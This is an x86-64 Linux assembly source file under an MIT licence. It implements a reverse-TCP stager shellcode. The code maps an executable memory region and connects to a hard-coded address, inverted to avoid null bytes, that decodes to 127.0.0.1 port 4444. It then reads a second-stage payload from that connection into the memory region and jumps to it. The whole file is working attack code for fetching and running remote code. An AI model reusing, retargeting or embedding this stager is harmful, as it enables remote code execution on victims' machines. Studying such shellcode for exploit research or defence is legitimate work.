;The MIT License (MIT)

;Copyright (c) 2017 Robert L. Taylor

;Permission is hereby granted, free of charge, to any person obtaining a 
;copy of this software and associated documentation files (the “Software”), 
;to deal in the Software without restriction, including without limitation 
;the rights to use, copy, modify, merge, publish, distribute, sublicense, 
;and/or sell copies of the Software, and to permit persons to whom the 
;Software is furnished to do so, subject to the following conditions:

;The above copyright notice and this permission notice shall be included 
;in all copies or substantial portions of the Software.

;The Software is provided “as is”, without warranty of any kind, express or
;implied, including but not limited to the warranties of merchantability, 
;fitness for a particular purpose and noninfringement. In no event shall the
;authors or copyright holders be liable for any claim, damages or other 
;liability, whether in an action of contract, tort or otherwise, arising 
;from, out of or in connection with the software or the use or other 
;dealings in the Software.

global _start 

section .text

_start:
; mmap
	xor edi,edi
	push 9
	pop rax
	cdq   
	mov dh,16
	push rdx
	pop rsi
	mov dl,7
	xor r9,r9
	push 34
	pop r10
	syscall 
	push rsi
	push rax
; Socket
	push 41
	pop rax
	push 2
	pop rdi
	push 1
	pop rsi
	cdq    
	syscall 
; Connect
	xchg edi,eax
	mov rbx, 0xfeffff80a3eefffd ; not encoded 0x0100007f5c110002
	not rbx
	push rbx
	push rsp
	pop rsi
	mov dl,16
	mov al,42
	syscall 
; Read
	pop rcx
	pop rsi
	pop rdx
	syscall 
	push rsi
	ret
